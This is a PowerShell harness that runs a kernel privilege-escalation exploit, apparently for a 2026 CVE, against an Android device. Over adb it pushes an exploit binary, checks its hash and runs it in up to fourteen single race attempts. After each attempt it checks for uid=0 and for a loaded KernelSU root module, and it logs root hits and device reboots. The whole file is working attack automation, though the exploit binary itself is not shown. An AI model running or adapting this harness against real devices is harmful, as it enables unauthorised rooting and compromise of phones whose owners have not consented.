# Single-attempt rounds: one exploit process == one race try, minimising the
# chance of a kernel-level mishap, and re-push the payload every round.
$ErrorActionPreference = "Continue"
$dev   = "0484885189A00540"
$local = "E:\code\CVE\cve-2026-98260-xring\o3root-port\build\o3p_ksu_cfi.bin"
$hash  = (Get-FileHash $local -Algorithm SHA256).Hash.ToLower()
$out   = "E:\code\CVE\cve-2026-98260-xring\ab-logs\ksu-loop3.txt"

function Log($m) { $m | Tee-Object -FilePath $out -Append }
function Uptime { [double]((adb -s $dev shell "cut -d' ' -f1 /proc/uptime") -join "") }

Remove-Item $out -ErrorAction SilentlyContinue
Log "=== loop3 start $(Get-Date -Format HH:mm:ss)"

$hits = 0
for ($round = 1; $round -le 14; $round++) {
    adb -s $dev push $local /data/local/tmp/o3pK.bin 2>&1 | Out-Null
    $h = (adb -s $dev shell "sha256sum /data/local/tmp/o3pK.bin 2>/dev/null") -join " "
    if ($h -notmatch $hash) { Log "[$round] push FAILED"; Start-Sleep 20; continue }
    adb -s $dev shell "chmod 755 /data/local/tmp/o3pK.bin" | Out-Null

    $up0 = Uptime
    adb -s $dev shell "cd /data/local/tmp; rm -f s_$round.log o3p_insmod.out; ./o3pK.bin 10000 8192 0 0 1 1 8000 200 > s_$round.log 2>&1" | Out-Null
    $up1 = Uptime

    $uid  = ((adb -s $dev shell "grep -a -oE 'UIDNOW uid=[0-9]+' /data/local/tmp/s_$round.log | tail -1") -join "").Trim()
    $mods = ((adb -s $dev shell "grep -c kernelsu /proc/modules 2>/dev/null") -join "").Trim()
    $rbt  = ($up1 -lt $up0 -or $up1 -lt 90)

    Log "[$round] up $([math]::Round($up0))->$([math]::Round($up1)) reboot=$rbt ${uid} kernelsu=$mods"

    if ($mods -eq "1") { Log "[$round] *** KERNELSU LIVE ***"; $hits++; break }
    if ($uid -match "uid=0") {
        $hits++
        $keys = ((adb -s $dev shell "grep -a -E 'KSU_MODULE|KSU_INSMOD|KSU_WROTE|KSU_EXEC|KSU_BLOB' /data/local/tmp/s_$round.log | tail -6") -join " | ")
        Log "     ROOT HIT: $keys"
        if ($mods -ne "1") { Log "     (module not live - stopping to inspect)"; break }
    }
    if ($rbt) { Start-Sleep -Seconds 40 } else { Start-Sleep -Seconds 8 }
}
Log "=== loop3 end $(Get-Date -Format HH:mm:ss) hits=$hits"
